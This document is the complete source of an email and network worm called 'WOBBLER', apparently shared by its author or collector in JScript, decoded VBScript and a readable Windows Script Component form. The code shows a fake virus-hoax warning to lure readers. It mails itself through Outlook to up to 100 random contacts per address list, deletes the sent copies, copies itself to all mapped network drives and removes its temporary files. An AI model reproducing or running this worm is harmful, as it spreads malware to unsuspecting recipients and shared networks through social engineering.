G=new ActiveXObject("Scripting.FileSystemObject");
A=G.GetTempName().concat(".WSC");
S=G.CreateTextFile(G.BuildPath(G.GetSpecialFolder(2),A),true);
S.Write("<?XML version=\"1.0\"?>\r\n<component>\r\n  <comment>\r\n    NETWORK/OUTLOOK.FakeHoax\r\n  </comment>\r\n  <public>\r\n    <property name=\"AttachmentFile\"/>\r\n    <property name=\"TextFile\"/>\r\n    <property name=\"WormFile\"/>\r\n    <method name=\"DelTempFiles\"/>\r\n    <method name=\"NetworkSpreading\">\r\n      <parameter name=\"FileName\"/>\r\n    </method>\r\n    <method name=\"OutlookSpreading\">\r\n      <parameter name=\"Body\"/>\r\n      <parameter name=\"MaxAmount\"/>\r\n      <parameter name=\"Subject\"/>\r\n    </method>\r\n    <method name=\"ShowText\">\r\n      <parameter name=\"Content\"/>\r\n    </method>\r\n  </public>\r\n  <script language=\"VBScript\">\r\n    <![CDATA[\r\n    Sub DelTempFiles\r\n      On Error Resume Next\r\n      Set FSO = CreateObject(\"Scripting.FileSystemObject\")\r\n      If FSO.FileExists(AttachmentFile) Then FSO.DeleteFile AttachmentFile, True\r\n      If FSO.FileExists(TextFile) Then FSO.DeleteFile TextFile, True\r\n      Set FSO = Nothing\r\n    End Sub\r\n    Sub NetworkSpreading(FileName)\r\n      On Error Resume Next\r\n      Set Network = CreateObject(\"WScript.Network\")\r\n      Set Shares = Network.EnumNetworkDrives\r\n      If Shares.Count > 0 Then\r\n        Set FSO = CreateObject(\"Scripting.FileSystemObject\")\r\n        For Counter1 = 0 To Shares.Count - 1\r\n          If Shares.Item(Counter1) <> \"\" Then FSO.CopyFile WormFile, FSO.BuildPath(Shares.Item(Counter1), FileName)\r\n        Next\r\n        Set FSO = Nothing\r\n      End If\r\n      Set Shares = Nothing\r\n      Set Network = Nothing\r\n    End Sub\r\n    Sub OutlookSpreading(MaxAmount, Subject, Body)\r\n      On Error Resume Next\r\n      Set FSO = CreateObject(\"Scripting.FileSystemObject\")\r\n      FSO.CopyFile WormFile, AttachmentFile\r\n      Set FSO = Nothing\r\n      Outlook = \"\"\r\n      Set Outlook = CreateObject(\"Outlook.Application\")\r\n      If Outlook <> \"\" Then\r\n        Set MAPI = Outlook.GetNameSpace(\"MAPI\")\r\n        For Each List In MAPI.AddressLists\r\n          If List.AddressEntries.Count > 0 Then\r\n            Set Email1 = Outlook.CreateItem(0)\r\n            If List.AddressEntries.Count > MaxAmount Then\r\n              Dim Address()\r\n              ReDim Address(MaxAmount - 1)\r\n              For Counter1 = 0 To MaxAmount - 1\r\n                Address(Counter1) = Int(List.AddressEntries.Count * Rnd)\r\n              Next\r\n              For Counter1 = 0 To MaxAmount - 1\r\n                For Counter2 = Counter1 + 1 To MaxAmount - 1\r\n                  If Address(Counter1) = Address(Counter2) And Address(Counter1) <> -1 Then Address(Counter2) = -1\r\n                Next\r\n              Next\r\n              For Counter1 = 0 To MaxAmount - 1\r\n                If Address(Counter1) = -1 Then Address(Counter1) = Int(List.AddressEntries.Count * Rnd)\r\n              Next\r\n              For Counter1 = 0 To MaxAmount - 1\r\n                For Counter2 = Counter1 + 1 To MaxAmount - 1\r\n                  If Address(Counter1) = Address(Counter2) And Address(Counter1) <> -1 Then Address(Counter2) = -1\r\n                Next\r\n              Next\r\n              For Counter1 = 0 To MaxAmount - 1\r\n                If Address(Counter1) <> -1 Then\r\n                  Set Entry = List.AddressEntries(Address(Counter1))\r\n                  If Counter1 = 0 Then Addresses = Entry.Address Else Addresses = Addresses & \"; \" & Entry.Address\r\n                  Set Entry = Nothing\r\n                End If\r\n              Next\r\n            Else\r\n              For Counter1 = 1 To List.AddressEntries.Count\r\n                Set Entry = List.AddressEntries(Counter1)\r\n                If Counter1 = 1 Then Addresses = Entry.Address Else Addresses = Addresses & \"; \" & Entry.Address\r\n                Set Entry = Nothing\r\n              Next\r\n            End If\r\n            Email1.BCC = Addresses\r\n            Email1.Subject = Subject\r\n            Email1.Body = Body\r\n            Email1.Attachments.Add AttachmentFile\r\n            Email1.DeleteAfterSubmit = True\r\n            Email1.Send\r\n            Set Email1 = Nothing\r\n            Randomize\r\n            If Int(5 * Rnd) = 0 Then\r\n              Set Email2 = Outlook.CreateItem(0)\r\n              Email2.BCC = Addresses\r\n              Email2.Subject = \"Alma\"\r\n              Email2.Body = \"No alucines que te amo,\" & Chr(13) & Chr(10) & \"cuando en realidad es solo\" & Chr(13) & Chr(10) & \"mi coraz\" & Chr(243) & \"n qui\" & Chr(233) & \"n lo hace.\" & Chr(13) & Chr(10) & \"Porque como ya sabr\" & Chr(225) & \"s,\" & Chr(13) & Chr(10) & \"mi coraz\" & Chr(243) & \"n no manda en mi vida,\" & Chr(13) & Chr(10) & \"si as\" & Chr(237) & \" lo hiciera,\" & Chr(13) & Chr(10) & \"mi alma estar\" & Chr(237) & \"a perdida.\"\r\n              Email2.DeleteAfterSubmit = True\r\n              Email2.Send\r\n              Set Email2 = Nothing\r\n            End If\r\n          End If\r\n        Next\r\n        Set MAPI = Nothing\r\n        Set Outlook = Nothing\r\n      End If\r\n    End Sub\r\n    Sub ShowText(Content)\r\n      On Error Resume Next\r\n      Set FSO = CreateObject(\"Scripting.FileSystemObject\")\r\n      Set File = FSO.CreateTextFile(TextFile, True)\r\n      File.Write(Content)\r\n      File.Close\r\n      Set File = Nothing\r\n      Set FSO = Nothing\r\n      Set WSHShell = CreateObject(\"WScript.Shell\")\r\n      WSHShell.Run(TextFile)\r\n      Set WSHShell = Nothing\r\n    End Sub\r\n    ]]>\r\n  </script>\r\n</component>\r\n")
S.Close();
F=GetObject("script:".concat(G.BuildPath(G.GetSpecialFolder(2),A)));
F.AttachmentFile=G.BuildPath(G.GetSpecialFolder(2),"WOBBLER.TXT.JSE");
F.TextFile=G.BuildPath(G.GetSpecialFolder(2),"WOBBLER.TXT");
F.WormFile=WScript.ScriptFullName;
F.ShowText("Thought you might be interested in this message. If you receive an\r\nemail with a file called \"California\" do not open the file. The file\r\ncontains the \"WOBBLER\" virus.\r\n\r\nThis information was announced yesterday morning by IBM. The statement\r\nsays that ... \"This is a very dangerous virus, much worse than\r\n'Melissa' and there is NO remedy for it at this time. Some very sick\r\nindividual has succeeded in using the reformat function from Norton\r\nUtilities causing it to completely erase all documents on the hard\r\ndrive. It has been designed to work with Netscape Navigator and\r\nMicrosoft Internet Explorer. It destroys Macintosh and IBM compatible\r\ncomputers. This is a new, very malicious virus and not many people\r\nknow about it at this time.\"\r\n\"Please pass this warning file to everyone in your address book and\r\nshare it with all your online friends ASAP so that the destruction it\r\ncan cause may be minimized.\"\r\n");
F.OutlookSpreading(100,"Fw: important","> Thought you might be interested in this message, read the attachment for more information.");
F.NetworkSpreading("WOBBLER.TXT.JSE");
F.DelTempFiles();
G.DeleteFile(G.BuildPath(G.GetSpecialFolder(2),A),true);

Here is the VBE file without encoding:

Set G=CreateObject("Scripting.FileSystemObject")
A=G.GetTempName&".WSC"
Set S=G.CreateTextFile(G.BuildPath(G.GetSpecialFolder(2),A),True)
O=Chr(13)&Chr(10)
S.Write "<?XML version=""1.0""?>"&O&"<component>"&O&"  <comment>"&O&"    NETWORK/OUTLOOK.FakeHoax"&O&"  </comment>"&O&"  <public>"&O&"    <property name=""AttachmentFile""/>"&O&"    <property name=""TextFile""/>"&O&"    <property name=""WormFile""/>"&O&"    <method name=""DelTempFiles""/>"&O&"    <method name=""NetworkSpreading"">"&O&"      <parameter name=""FileName""/>"&O&"    </method>"&O&"    <method name=""OutlookSpreading"">"&O&"      <parameter name=""Body""/>"&O&"      <parameter name=""MaxAmount""/>"&O&"      <parameter name=""Subject""/>"&O&"    </method>"&O&"    <method name=""ShowText"">"&O&"      <parameter name=""Content""/>"&O&"    </method>"&O&"  </public>"&O&"  <script language=""VBScript"">"&O&"    <![CDATA["&O&"    Sub DelTempFiles"&O&"      On Error Resume Next"&O&"      Set FSO = CreateObject(""Scripting.FileSystemObject"")"&O&"      If FSO.FileExists(AttachmentFile) Then FSO.DeleteFile AttachmentFile, True"&O&"      If FSO.FileExists(TextFile) Then FSO.DeleteFile TextFile, True"&O&"      Set FSO = Nothing"&O&"    End Sub"&O&"    Sub NetworkSpreading(FileName)"&O&"      On Error Resume Next"&O&"      Set Network = CreateObject(""WScript.Network"")"&O&"      Set Shares = Network.EnumNetworkDrives"&O&"      If Shares.Count > 0 Then"&O&"        Set FSO = CreateObject(""Scripting.FileSystemObject"")"&O&"        For Counter1 = 0 To Shares.Count - 1"&O&"          If Shares.Item(Counter1) <> """" Then FSO.CopyFile WormFile, FSO.BuildPath(Shares.Item(Counter1), FileName)"&O&"        Next"&O&"        Set FSO = Nothing"&O&"      End If"&O&"      Set Shares = Nothing"&O&"      Set Network = Nothing"&O&"    End Sub"&O&"    Sub OutlookSpreading(MaxAmount, Subject, Body)"&O&"      On Error Resume Next"&O&"      Set FSO = CreateObject(""Scripting.FileSystemObject"")"&O&"      FSO.CopyFile WormFile, AttachmentFile"&O&"      Set FSO = Nothing"&O&"      Outlook = """""&O&"      Set Outlook = CreateObject(""Outlook.Application"")"&O&"      If Outlook <> """" Then"&O&"        Set MAPI = Outlook.GetNameSpace(""MAPI"")"&O&"        For Each List In MAPI.AddressLists"&O&"          If List.AddressEntries.Count > 0 Then"&O&"            Set Email1 = Outlook.CreateItem(0)"&O&"            If List.AddressEntries.Count > MaxAmount Then"&O&"              Dim Address()"&O&"              ReDim Address(MaxAmount - 1)"&O&"              For Counter1 = 0 To MaxAmount - 1"&O&"                Address(Counter1) = Int(List.AddressEntries.Count * Rnd)"&O&"              Next"&O&"              For Counter1 = 0 To MaxAmount - 1"&O&"                For Counter2 = Counter1 + 1 To MaxAmount - 1"&O&"                  If Address(Counter1) = Address(Counter2) And Address(Counter1) <> -1 Then Address(Counter2) = -1"&O&"                Next"&O&"              Next"&O&"              For Counter1 = 0 To MaxAmount - 1"&O&"                If Address(Counter1) = -1 Then Address(Counter1) = Int(List.AddressEntries.Count * Rnd)"&O&"              Next"&O&"              For Counter1 = 0 To MaxAmount - 1"&O&"                For Counter2 = Counter1 + 1 To MaxAmount - 1"&O&"                  If Address(Counter1) = Address(Counter2) And Address(Counter1) <> -1 Then Address(Counter2) = -1"&O&"                Next"&O&"              Next"&O&"              For Counter1 = 0 To MaxAmount - 1"&O&"                If Address(Counter1) <> -1 Then"&O&"                  Set Entry = List.AddressEntries(Address(Counter1))"&O&"                  If Counter1 = 0 Then Addresses = Entry.Address Else Addresses = Addresses & ""; "" & Entry.Address"&O&"                  Set Entry = Nothing"&O&"                End If"&O&"              Next"&O&"            Else"&O&"              For Counter1 = 1 To List.AddressEntries.Count"&O&"                Set Entry = List.AddressEntries(Counter1)"&O&"                If Counter1 = 1 Then Addresses = Entry.Address Else Addresses = Addresses & ""; "" & Entry.Address"&O&"                Set Entry = Nothing"&O&"              Next"&O&"            End If"&O&"            Email1.BCC = Addresses"&O&"            Email1.Subject = Subject"&O&"            Email1.Body = Body"&O&"            Email1.Attachments.Add AttachmentFile"&O&"            Email1.DeleteAfterSubmit = True"&O&"            Email1.Send"&O&"            Set Email1 = Nothing"&O&"            Randomize"&O&"            If Int(5 * Rnd) = 0 Then"&O&"              Set Email2 = Outlook.CreateItem(0)"&O&"              Email2.BCC = Addresses"&O&"              Email2.Subject = ""Alma"""&O&"              Email2.Body = ""No alucines que te amo,"" & Chr(13) & Chr(10) & ""cuando en realidad es solo"" & Chr(13) & Chr(10) & ""mi coraz"" & Chr(243) & ""n qui"" & Chr(233) & ""n lo hace."" & Chr(13) & Chr(10) & ""Porque como ya sabr"" & Chr(225) & ""s,"" & Chr(13) & Chr(10) & ""mi coraz"" & Chr(243) & ""n no manda en mi vida,"" & Chr(13) & Chr(10) & ""si as"" & Chr(237) & "" lo hiciera,"" & Chr(13) & Chr(10) & ""mi alma estar"" & Chr(237) & ""a perdida."""&O&"              Email2.DeleteAfterSubmit = True"&O&"              Email2.Send"&O&"              Set Email2 = Nothing"&O&"            End If"&O&"          End If"&O&"        Next"&O&"        Set MAPI = Nothing"&O&"        Set Outlook = Nothing"&O&"      End If"&O&"    End Sub"&O&"    Sub ShowText(Content)"&O&"      On Error Resume Next"&O&"      Set FSO = CreateObject(""Scripting.FileSystemObject"")"&O&"      Set File = FSO.CreateTextFile(TextFile, True)"&O&"      File.Write(Content)"&O&"      File.Close"&O&"      Set File = Nothing"&O&"      Set FSO = Nothing"&O&"      Set WSHShell = CreateObject(""WScript.Shell"")"&O&"      WSHShell.Run(TextFile)"&O&"      Set WSHShell = Nothing"&O&"    End Sub"&O&"    ]]>"&O&"  </script>"&O&"</component>"&O
S.Close
Set F=GetObject("script:"&G.BuildPath(G.GetSpecialFolder(2),A))
F.AttachmentFile=G.BuildPath(G.GetSpecialFolder(2),"WOBBLER.TXT.VBE")
F.TextFile=G.BuildPath(G.GetSpecialFolder(2),"WOBBLER.TXT")
F.WormFile=WScript.ScriptFullName
F.ShowText "Thought you might be interested in this message. If you receive an"&O&"email with a file called ""California"" do not open the file. The file"&O&"contains the ""WOBBLER"" virus."&O&O&"This information was announced yesterday morning by IBM. The statement"&O&"says that ... ""This is a very dangerous virus, much worse than"&O&"'Melissa' and there is NO remedy for it at this time. Some very sick"&O&"individual has succeeded in using the reformat function from Norton"&O&"Utilities causing it to completely erase all documents on the hard"&O&"drive. It has been designed to work with Netscape Navigator and"&O&"Microsoft Internet Explorer. It destroys Macintosh and IBM compatible"&O&"computers. This is a new, very malicious virus and not many people"&O&"know about it at this time."""&O&"""Please pass this warning file to everyone in your address book and"&O&"share it with all your online friends ASAP so that the destruction it"&O&"can cause may be minimized."""&O
F.OutlookSpreading 100,"Fw: important","> Thought you might be interested in this message, read the attachment for more information."
F.NetworkSpreading "WOBBLER.TXT.VBE"
F.DelTempFiles
G.DeleteFile G.BuildPath(G.GetSpecialFolder(2),A),True

Here is the WSC file (the COM object), I used spaces and "normal" variable names to make it
easier to read:

<?XML version="1.0"?>
<component>
  <comment>
    NETWORK/OUTLOOK.FakeHoax
  </comment>
  <public>
    <property name="AttachmentFile"/>
    <property name="TextFile"/>
    <property name="WormFile"/>
    <method name="DelTempFiles"/>
    <method name="NetworkSpreading">
      <parameter name="FileName"/>
    </method>
    <method name="OutlookSpreading">
      <parameter name="Body"/>
      <parameter name="MaxAmount"/>
      <parameter name="Subject"/>
    </method>
    <method name="ShowText">
      <parameter name="Content"/>
    </method>
  </public>
  <script language="VBScript">
    <![CDATA[
    Sub DelTempFiles
      On Error Resume Next
      Set FSO = CreateObject("Scripting.FileSystemObject")
      If FSO.FileExists(AttachmentFile) Then FSO.DeleteFile AttachmentFile, True
      If FSO.FileExists(TextFile) Then FSO.DeleteFile TextFile, True
      Set FSO = Nothing
    End Sub
    Sub NetworkSpreading(FileName)
      On Error Resume Next
      Set Network = CreateObject("WScript.Network")
      Set Shares = Network.EnumNetworkDrives
      If Shares.Count > 0 Then
        Set FSO = CreateObject("Scripting.FileSystemObject")
        For Counter1 = 0 To Shares.Count - 1
          If Shares.Item(Counter1) <> "" Then FSO.CopyFile WormFile, FSO.BuildPath(Shares.Item(Counter1), FileName)
        Next
        Set FSO = Nothing
      End If
      Set Shares = Nothing
      Set Network = Nothing
    End Sub
    Sub OutlookSpreading(MaxAmount, Subject, Body)
      On Error Resume Next
      Set FSO = CreateObject("Scripting.FileSystemObject")
      FSO.CopyFile WormFile, AttachmentFile
      Set FSO = Nothing
      Outlook = ""
      Set Outlook = CreateObject("Outlook.Application")
      If Outlook <> "" Then
        Set MAPI = Outlook.GetNameSpace("MAPI")
        For Each List In MAPI.AddressLists
          If List.AddressEntries.Count > 0 Then
            Set Email1 = Outlook.CreateItem(0)
            If List.AddressEntries.Count > MaxAmount Then
              Dim Address()
              ReDim Address(MaxAmount - 1)
              For Counter1 = 0 To MaxAmount - 1
                Address(Counter1) = Int(List.AddressEntries.Count * Rnd)
              Next
              For Counter1 = 0 To MaxAmount - 1
                For Counter2 = Counter1 + 1 To MaxAmount - 1
                  If Address(Counter1) = Address(Counter2) And Address(Counter1) <> -1 Then Address(Counter2) = -1
                Next
              Next
              For Counter1 = 0 To MaxAmount - 1
                If Address(Counter1) = -1 Then Address(Counter1) = Int(List.AddressEntries.Count * Rnd)
              Next
              For Counter1 = 0 To MaxAmount - 1
                For Counter2 = Counter1 + 1 To MaxAmount - 1
                  If Address(Counter1) = Address(Counter2) And Address(Counter1) <> -1 Then Address(Counter2) = -1
                Next
              Next
              For Counter1 = 0 To MaxAmount - 1
                If Address(Counter1) <> -1 Then
                  Set Entry = List.AddressEntries(Address(Counter1))
                  If Counter1 = 0 Then Addresses = Entry.Address Else Addresses = Addresses & "; " & Entry.Address
                  Set Entry = Nothing
                End If
              Next
            Else
              For Counter1 = 1 To List.AddressEntries.Count
                Set Entry = List.AddressEntries(Counter1)
                If Counter1 = 1 Then Addresses = Entry.Address Else Addresses = Addresses & "; " & Entry.Address
                Set Entry = Nothing
              Next
            End If
            Email1.BCC = Addresses
            Email1.Subject = Subject
            Email1.Body = Body
            Email1.Attachments.Add AttachmentFile
            Email1.DeleteAfterSubmit = True
            Email1.Send
            Set Email1 = Nothing
            Randomize
            If Int(5 * Rnd) = 0 Then
              Set Email2 = Outlook.CreateItem(0)
              Email2.BCC = Addresses
              Email2.Subject = "Alma"
              Email2.Body = "No alucines que te amo," & Chr(13) & Chr(10) & "cuando en realidad es solo" & Chr(13) & Chr(10) & "mi coraz" & Chr(243) & "n qui" & Chr(233) & "n lo hace." & Chr(13) & Chr(10) & "Porque como ya sabr" & Chr(225) & "s," & Chr(13) & Chr(10) & "mi coraz" & Chr(243) & "n no manda en mi vida," & Chr(13) & Chr(10) & "si as" & Chr(237) & " lo hiciera," & Chr(13) & Chr(10) & "mi alma estar" & Chr(237) & "a perdida."
              Email2.DeleteAfterSubmit = True
              Email2.Send
              Set Email2 = Nothing
            End If
          End If
        Next
        Set MAPI = Nothing
        Set Outlook = Nothing
      End If
    End Sub
    Sub ShowText(Content)
      On Error Resume Next
      Set FSO = CreateObject("Scripting.FileSystemObject")
      Set File = FSO.CreateTextFile(TextFile, True)
      File.Write(Content)
      File.Close
      Set File = Nothing
      Set FSO = Nothing
      Set WSHShell = CreateObject("WScript.Shell")
      WSHShell.Run(TextFile)
      Set WSHShell = Nothing
    End Sub
    ]]>
  </script>
</component>
